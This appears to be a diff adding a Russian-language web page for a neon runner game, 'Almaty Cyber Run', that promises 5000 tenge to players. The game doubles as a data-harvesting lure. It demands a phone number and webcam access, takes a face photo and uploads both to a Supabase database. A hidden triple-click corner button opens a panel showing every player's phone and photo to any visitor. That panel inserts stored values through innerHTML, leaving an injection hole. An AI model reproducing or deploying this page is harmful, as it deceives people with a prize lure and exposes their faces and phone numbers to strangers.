@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Almaty Cyber Run - 5000 KZT</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&display=swap');
+
+        body { 
+            margin: 0; 
+            font-family: 'Orbitron', sans-serif; 
+            background: #050014; 
+            text-align: center; 
+            overflow: hidden; 
+            touch-action: none; 
+            color: #fff;
+        }
+        #app { width: 100vw; height: 100vh; position: relative; overflow: hidden; }
+        
+        .screen { 
+            width: 100%; height: 100%; 
+            position: absolute; top: 0; left: 0; 
+            display: none; flex-direction: column; 
+            justify-content: center; align-items: center; 
+            background: linear-gradient(180deg, #050014 0%, #1a0033 100%);
+            z-index: 5;
+        }
+        .active { display: flex; }
+        
+        h2 { text-transform: uppercase; text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff; font-size: 32px; margin-bottom: 10px; }
+        p { text-shadow: 0 0 5px #ff00ff; font-size: 18px; margin-bottom: 20px; }
+        
+        input { 
+            padding: 12px; margin: 10px; font-size: 16px; 
+            border-radius: 5px; border: 2px solid #00ffff; 
+            background: rgba(0,0,0,0.5); color: #00ffff; 
+            font-family: 'Orbitron', sans-serif; outline: none;
+            text-align: center;
+        }
+        input::placeholder { color: rgba(0, 255, 255, 0.5); }
+        
+        button { 
+            padding: 15px 30px; margin: 10px; font-size: 18px; 
+            border-radius: 5px; border: 2px solid #ff00ff; 
+            background: rgba(255, 0, 255, 0.2); color: #fff; 
+            cursor: pointer; font-weight: bold; font-family: 'Orbitron', sans-serif;
+            text-transform: uppercase; text-shadow: 0 0 5px #ff00ff;
+            box-shadow: 0 0 15px rgba(255, 0, 255, 0.5);
+            transition: all 0.2s;
+        }
+        button:hover { background: rgba(255, 0, 255, 0.5); box-shadow: 0 0 25px rgba(255, 0, 255, 0.8); }
+        
+        #videoElement { 
+            width: 180px; height: 140px; background: #000; 
+            border-radius: 10px; object-fit: cover; margin-bottom: 15px; 
+            border: 2px solid #00ffff; box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
+        }
+        
+        .info { 
+            position: absolute; top: 15px; left: 20px; 
+            font-weight: bold; font-size: 20px; z-index: 10; 
+            text-shadow: 0 0 5px #00ffff; 
+        }
+        
+        a.whatsapp { 
+            display: inline-block; padding: 15px 30px; 
+            background: transparent; color: #fff; 
+            text-decoration: none; border-radius: 5px; 
+            font-size: 20px; font-weight: bold; margin-top: 20px; 
+            border: 2px solid #25D366; box-shadow: 0 0 15px rgba(37, 211, 102, 0.6);
+            text-shadow: 0 0 5px #25D366; transition: all 0.2s;
+        }
+        a.whatsapp:hover { background: rgba(37, 211, 102, 0.3); }
+        
+        #jumpBtn { 
+            position: absolute; bottom: 30px; right: 30px; 
+            width: 90px; height: 90px; 
+            background: rgba(0, 255, 255, 0.1); border-radius: 50%; 
+            color: #00ffff; font-weight: bold; display: flex; 
+            justify-content: center; align-items: center; font-size: 14px; 
+            user-select: none; z-index: 20; border: 2px solid #00ffff;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.4);
+            backdrop-filter: blur(5px);
+        }
+        #jumpBtn:active { background: rgba(0, 255, 255, 0.3); }
+        
+        #rotateScreen { 
+            display: none; position: absolute; top:0; left:0; width:100%; height:100%; 
+            background: #050014; color: #00ffff; z-index: 999; 
+            justify-content:center; align-items:center; font-size: 24px; 
+            text-align: center; padding: 20px; box-sizing: border-box; 
+            text-shadow: 0 0 10px #00ffff;
+        }
+        @media screen and (orientation: portrait) { #rotateScreen { display: flex; } }
+
+        /* Custom Alert */
+        #msgBox {
+            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center;
+        }
+        .msg-content {
+            background: #1a0033; padding: 30px; border-radius: 10px; border: 2px solid #ff00ff;
+            box-shadow: 0 0 30px rgba(255,0,255,0.5); text-align: center; max-width: 80%;
+        }
+
+        #adminPanel { 
+            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(5,0,20,0.95); z-index: 100; overflow-y: scroll; padding: 20px; text-align: left; 
+        }
+        .admin-item { display: flex; align-items: center; margin-bottom: 15px; border-bottom: 1px solid #ff00ff; padding-bottom: 15px; }
+        .admin-item img { width: 120px; border-radius: 5px; margin-left: 20px; border: 1px solid #00ffff; }
+        #secretBtn { position: absolute; top: 0; left: 0; width: 50px; height: 50px; z-index: 50; }
+        
+        canvas { display: block; position: absolute; top: 0; left: 0; z-index: 1; }
+    </style>
+</head>
+<body>
+
+<div id="rotateScreen">ПЕРЕВЕРНИ УСТРОЙСТВО<br>🔄 ГОРИЗОНТАЛЬНО</div>
+
+<div id="msgBox">
+    <div class="msg-content">
+        <h3 id="msgText" style="margin-top:0; color: #00ffff;"></h3>
+        <button onclick="closeMsg()">Понял</button>
+    </div>
+</div>
+
+<div id="app">
+    <div id="secretBtn" onclick="openAdmin()"></div>
+
+    <!-- Регистрация -->
+    <div id="screen-reg" class="screen active">
+        <h2>Cyber Almaty Run</h2>
+        <p>Пройди трассу и получи <b>5000 KZT</b>!</p>
+        <input type="text" id="phone" placeholder="Введи номер телефона">
+        <video id="videoElement" autoplay playsinline></video>
+        <button onclick="startCamera()" id="camBtn">1. Доступ к камере</button>
+        <button onclick="registerAndPlay()" style="display: none; border-color:#00ffff; box-shadow: 0 0 15px rgba(0,255,255,0.5);" id="playBtn">2. ИГРАТЬ</button>
+    </div>
+
+    <canvas id="photoCanvas" width="200" height="150" style="display:none;"></canvas>
+
+    <!-- Игра -->
+    <div id="screen-game" class="screen" style="background: transparent;">
+        <div class="info">LIVES: <span id="livesText" style="color:#ff00ff;">3</span> | TIME: <span id="timeText" style="color:#00ffff;">15</span>s</div>
+        <div id="jumpBtn">JUMP</div>
+    </div>
+
+    <!-- Конец -->
+    <div id="screen-end" class="screen">
+        <h2 id="end-title">СИСТЕМА ОСТАНОВЛЕНА</h2>
+        <div id="win-content" style="display: none;">
+            <p>МИССИЯ ВЫПОЛНЕНА!</p>
+            <p>Забирай свои <b>5000 тенге</b>.</p>
+            <a href="https://wa.me/77775889784?text=Привет!%20Я%20прошел%20игру%20Almaty%20Run!" target="_blank" class="whatsapp">НАПИСАТЬ В WHATSAPP</a>
+        </div>
+        <button onclick="restartGame()" id="restartBtn">ПОВТОРИТЬ ЗАБЕГ</button>
+    </div>
+
+    <!-- Админка -->
+    <div id="adminPanel">
+        <h2 style="color:#00ffff;">База данных игроков</h2>
+        <button onclick="closeAdmin()" style="background: transparent; border-color: red; box-shadow: 0 0 10px red;">Закрыть</button>
+        <div id="adminList" style="margin-top: 20px;">Загрузка...</div>
+    </div>
+    
+    <!-- Музыка -->
+    <audio id="bgMusic" loop src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-16.mp3"></audio>
+</div>
+
+<!-- Канвас игры находится ниже UI экранов, но отрисовывается на фоне -->
+<canvas id="gameCanvas"></canvas>
+
+<script>
+    // Supabase
+    const supabaseUrl = 'https://oogblnhhgowkjaptarax.supabase.co';
+    const supabaseKey = 'sb_publishable_-fFNDDDzdIIHKeScdTh1yQ_-7Ne4Cog';
+    const db = supabase.createClient(supabaseUrl, supabaseKey);
+
+    // Audio Context (SFX)
+    let audioCtx;
+    function initAudio() {
+        if(!audioCtx) {
+            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        }
+        if(audioCtx.state === 'suspended') audioCtx.resume();
+    }
+
+    function playJumpSound() {
+        if(!audioCtx) return;
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.connect(gain); gain.connect(audioCtx.destination);
+        osc.type = 'square';
+        osc.frequency.setValueAtTime(300, audioCtx.currentTime);
+        osc.frequency.exponentialRampToValueAtTime(800, audioCtx.currentTime + 0.1);
+        gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.1);
+        osc.start(); osc.stop(audioCtx.currentTime + 0.1);
+    }
+
+    function playCrashSound() {
+        if(!audioCtx) return;
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.connect(gain); gain.connect(audioCtx.destination);
+        osc.type = 'sawtooth';
+        osc.frequency.setValueAtTime(150, audioCtx.currentTime);
+        osc.frequency.exponentialRampToValueAtTime(40, audioCtx.currentTime + 0.3);
+        gain.gain.setValueAtTime(0.3, audioCtx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
+        osc.start(); osc.stop(audioCtx.currentTime + 0.3);
+    }
+
+    // UI Messages
+    function showMsg(text) {
+        document.getElementById('msgText').innerText = text;
+        document.getElementById('msgBox').style.display = 'flex';
+    }
+    function closeMsg() { document.getElementById('msgBox').style.display = 'none'; }
+
+    // Game Variables
+    let canvas = document.getElementById('gameCanvas');
+    let ctx = canvas.getContext('2d');
+    let gameLoop;
+    let videoStream = null;
+    let registered = false; 
+    let shakeTime = 0;
+    
+    let lives = 3;
+    let frames = 0;
+    let maxFrames = 900; 
+    
+    let player = { x: 100, y: 0, w: 50, h: 20, dy: 0, gravity: 0.7, jump: -12, grounded: false };
+    let obstacle = { x: 2000, y: 0, w: 40, h: 70, speed: 9 }; 
+    let groundY = 0;
+    
+    let particles = [];
+    let stars = [];
+
+    // Initialize stars
+    for(let i=0; i<50; i++) {
+        stars.push({ x: Math.random()*2000, y: Math.random()*500, size: Math.random()*2, speed: Math.random()*1 + 0.5 });
+    }
+
+    function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        groundY = canvas.height - 80;
+        player.y = groundY - player.h;
+        obstacle.y = groundY - obstacle.h;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    function startCamera() {
+        initAudio();
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                videoStream = stream;
+                document.getElementById('videoElement').srcObject = stream;
+                document.getElementById('camBtn').style.display = 'none';
+                document.getElementById('playBtn').style.display = 'inline-block';
+            })
+            .catch(err => showMsg("Системе нужен доступ к камере для идентификации."));
+    }
+
+    async function registerAndPlay() {
+        initAudio();
+        let phone = document.getElementById('phone').value;
+        if(phone.length < 5) return showMsg("Ошибка: Введи корректный номер.");
+
+        if(!registered) {
+            let video = document.getElementById('videoElement');
+            let photoCanvas = document.getElementById('photoCanvas');
+            photoCanvas.getContext('2d').drawImage(video, 0, 0, 200, 150);
+            let photoBase64 = photoCanvas.toDataURL('image/jpeg');
+
+            db.from('players').insert([{ phone: phone, photo: photoBase64 }]).then(({error}) => {
+                if(error) console.log(error);
+            });
+            
+            if(videoStream) videoStream.getTracks().forEach(t => t.stop());
+            registered = true;
+        }
+        
+        document.getElementById('bgMusic').play().catch(e=>console.log("Audio play blocked"));
+        startGame();
+    }
+
+    function startGame() {
+        document.getElementById('screen-reg').classList.remove('active');
+        document.getElementById('screen-end').classList.remove('active');
+        document.getElementById('screen-game').classList.add('active');
+        lives = 3; frames = 0; player.y = groundY - player.h; player.dy = 0; obstacle.x = canvas.width;
+        particles = [];
+        document.getElementById('livesText').innerText = lives;
+        update();
+    }
+
+    function restartGame() {
+        document.getElementById('win-content').style.display = 'none';
+        startGame();
+    }
+
+    function doJump() {
+        if(player.grounded) { 
+            player.dy = player.jump; 
+            player.grounded = false; 
+            playJumpSound();
+            
+            // Burst particles on jump
+            for(let i=0; i<10; i++) {
+                particles.push({
+                    x: player.x + 10, y: player.y + player.h,
+                    vx: -Math.random()*3, vy: Math.random()*5,
+                    life: 1, color: '#00ffff'
+                });
+            }
+        }
+    }
+    window.addEventListener('keydown', e => { if(e.code === 'Space') doJump(); });
+    document.getElementById('jumpBtn').addEventListener('touchstart', (e) => { e.preventDefault(); doJump(); });
+    document.getElementById('jumpBtn').addEventListener('mousedown', doJump);
+    
+    // Allow tapping on the screen-game overlay to jump
+    document.getElementById('screen-game').addEventListener('touchstart', (e) => { if(e.target.id !== 'jumpBtn') doJump(); });
+    document.getElementById('screen-game').addEventListener('mousedown', (e) => { if(e.target.id !== 'jumpBtn') doJump(); });
+
+    function drawNeonRect(x, y, w, h, color, glowColor) {
+        ctx.shadowBlur = 15;
+        ctx.shadowColor = glowColor;
+        ctx.fillStyle = color;
+        ctx.fillRect(x, y, w, h);
+        ctx.shadowBlur = 0;
+    }
+
+    function update() {
+        ctx.fillStyle = '#050014';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        // Screen Shake
+        ctx.save();
+        if(shakeTime > 0) {
+            let dx = (Math.random() - 0.5) * 15;
+            let dy = (Math.random() - 0.5) * 15;
+            ctx.translate(dx, dy);
+            shakeTime--;
+        }
+
+        // Parallax Stars
+        ctx.fillStyle = '#fff';
+        stars.forEach(s => {
+            s.x -= s.speed;
+            if(s.x < 0) s.x = canvas.width;
+            ctx.globalAlpha = Math.random() * 0.5 + 0.5;
+            ctx.fillRect(s.x, s.y, s.size, s.size);
+        });
+        ctx.globalAlpha = 1.0;
+
+        // Parallax Mountains (Neon style)
+        ctx.strokeStyle = '#ff00ff';
+        ctx.lineWidth = 2;
+        ctx.shadowBlur = 10;
+        ctx.shadowColor = '#ff00ff';
+        ctx.beginPath();
+        let mOffset = (frames * 2) % 1000;
+        ctx.moveTo(0 - mOffset, groundY);
+        ctx.lineTo(150 - mOffset, groundY-150);
+        ctx.lineTo(300 - mOffset, groundY);
+        ctx.lineTo(500 - mOffset, groundY-250);
+        ctx.lineTo(700 - mOffset, groundY);
+        ctx.lineTo(900 - mOffset, groundY-100);
+        ctx.lineTo(1000 - mOffset, groundY);
+        
+        ctx.moveTo(1000 - mOffset, groundY);
+        ctx.lineTo(1150 - mOffset, groundY-150);
+        ctx.lineTo(1300 - mOffset, groundY);
+        ctx.lineTo(1500 - mOffset, groundY-250);
+        ctx.lineTo(1700 - mOffset, groundY);
+        ctx.lineTo(1900 - mOffset, groundY-100);
+        ctx.lineTo(2000 - mOffset, groundY);
+        ctx.stroke();
+        ctx.shadowBlur = 0;
+
+        // Ground Cyber Grid
+        ctx.fillStyle = '#0a0022';
+        ctx.fillRect(0, groundY, canvas.width, canvas.height - groundY);
+        
+        ctx.strokeStyle = '#00ffff';
+        ctx.lineWidth = 2;
+        ctx.shadowBlur = 10;
+        ctx.shadowColor = '#00ffff';
+        ctx.beginPath();
+        ctx.moveTo(0, groundY);
+        ctx.lineTo(canvas.width, groundY);
+        ctx.stroke();
+        
+        // Moving grid lines
+        let gridOffset = (frames * obstacle.speed) % 100;
+        for(let i = -100; i < canvas.width; i += 100) {
+            ctx.beginPath();
+            ctx.moveTo(i - gridOffset, groundY);
+            ctx.lineTo(i - gridOffset - 50, canvas.height); // perspective skew
+            ctx.stroke();
+        }
+        ctx.shadowBlur = 0;
+
+        // Physics
+        player.dy += player.gravity; 
+        player.y += player.dy;
+        if(player.y >= groundY - player.h) { 
+            player.y = groundY - player.h; 
+            player.grounded = true; 
+            player.dy = 0; 
+        }
+        
+        // Engine Particles Engine
+        if(frames % 2 === 0 && player.grounded) {
+            particles.push({
+                x: player.x, y: player.y + player.h/2 + (Math.random()*10-5),
+                vx: -Math.random()*4 - 2, vy: (Math.random()-0.5)*2,
+                life: 1, color: '#ff00ff'
+            });
+        }
+
+        // Draw Particles
+        for(let i=particles.length-1; i>=0; i--) {
+            let p = particles[i];
+            p.x += p.vx; p.y += p.vy; p.life -= 0.05;
+            if(p.life <= 0) { particles.splice(i, 1); continue; }
+            ctx.globalAlpha = p.life;
+            drawNeonRect(p.x, p.y, 6, 6, p.color, p.color);
+        }
+        ctx.globalAlpha = 1.0;
+
+        // Draw Player Drone
+        drawNeonRect(player.x, player.y, player.w, player.h, '#fff', '#00ffff'); // body
+        drawNeonRect(player.x - 5, player.y + player.h/2 - 4, 15, 8, '#ff00ff', '#ff00ff'); // engine thruster
+        drawNeonRect(player.x + player.w - 10, player.y - 5, 5, 5, '#00ffff', '#00ffff'); // top light
+
+        // Obstacle Logic
+        obstacle.x -= obstacle.speed;
+        if(obstacle.x < -obstacle.w) { 
+            obstacle.x = canvas.width + 200 + Math.random() * 400; 
+        }
+        
+        // Draw Obstacle (Neon Pillar)
+        drawNeonRect(obstacle.x, obstacle.y, obstacle.w, obstacle.h, '#111', '#00ff00');
+        drawNeonRect(obstacle.x + obstacle.w/2 - 2, obstacle.y, 4, obstacle.h, '#00ff00', '#00ff00'); // Inner core
+
+        // Collision detection (with forgiveness margin)
+        let margin = 5;
+        if(player.x < obstacle.x + obstacle.w - margin && 
+           player.x + player.w > obstacle.x + margin && 
+           player.y < obstacle.y + obstacle.h && 
+           player.y + player.h > obstacle.y + margin) {
+            
+            shakeTime = 15;
+            playCrashSound();
+            obstacle.x = canvas.width + 200; // Reset obstacle
+            lives--; 
+            document.getElementById('livesText').innerText = lives;
+            
+            // Explosion particles
+            for(let i=0; i<20; i++) {
+                particles.push({
+                    x: player.x + player.w, y: player.y,
+                    vx: (Math.random()-0.5)*10, vy: (Math.random()-0.5)*10,
+                    life: 1, color: '#fff'
+                });
+            }
+
+            if(lives <= 0) { 
+                ctx.restore();
+                return endGame(false); 
+            }
+        }
+
+        ctx.restore(); // Restore from shake
+
+        frames++; 
+        document.getElementById('timeText').innerText = Math.ceil((maxFrames - frames)/60);
+        if(frames >= maxFrames) { return endGame(true); }
+        
+        gameLoop = requestAnimationFrame(update);
+    }
+
+    function endGame(isWin) {
+        cancelAnimationFrame(gameLoop);
+        document.getElementById('screen-game').classList.remove('active'); 
+        document.getElementById('screen-end').classList.add('active');
+        
+        if(isWin) {
+            document.getElementById('end-title').innerText = "МИССИЯ ВЫПОЛНЕНА";
+            document.getElementById('end-title').style.color = "#00ff00";
+            document.getElementById('end-title').style.textShadow = "0 0 10px #00ff00";
+            document.getElementById('win-content').style.display = "block";
+            document.getElementById('restartBtn').style.display = "none"; 
+        } else {
+            document.getElementById('end-title').innerText = "СИСТЕМА РАЗРУШЕНА";
+            document.getElementById('end-title').style.color = "#ff0000";
+            document.getElementById('end-title').style.textShadow = "0 0 10px #ff0000";
+            document.getElementById('restartBtn').style.display = "inline-block";
+        }
+    }
+
+    // Admin Panel
+    let clicks = 0;
+    function openAdmin() {
+        clicks++;
+        if(clicks >= 3) { 
+            clicks = 0; 
+            document.getElementById('adminPanel').style.display = 'block'; 
+            loadPlayers(); 
+        }
+    }
+    function closeAdmin() { document.getElementById('adminPanel').style.display = 'none'; }
+    
+    async function loadPlayers() {
+        let list = document.getElementById('adminList'); 
+        list.innerHTML = "Синхронизация с сервером...";
+        const { data, error } = await db.from('players').select('*').order('created_at', { ascending: false });
+        if(error) { list.innerHTML = "Ошибка связи."; return; }
+        
+        list.innerHTML = "";
+        if(data.length === 0) list.innerHTML = "База пуста.";
+        
+        data.forEach(p => {
+            list.innerHTML += `<div class="admin-item">
+                <div>
+                    <b style="color:#00ffff;">${p.phone}</b><br>
+                    <small style="color:#ff00ff;">${new Date(p.created_at).toLocaleString()}</small>
+                </div>
+                ${p.photo ? `<img src="${p.photo}">` : ''}
+            </div>`;
+        });
+    }
+</script>
+</body>
+</html>
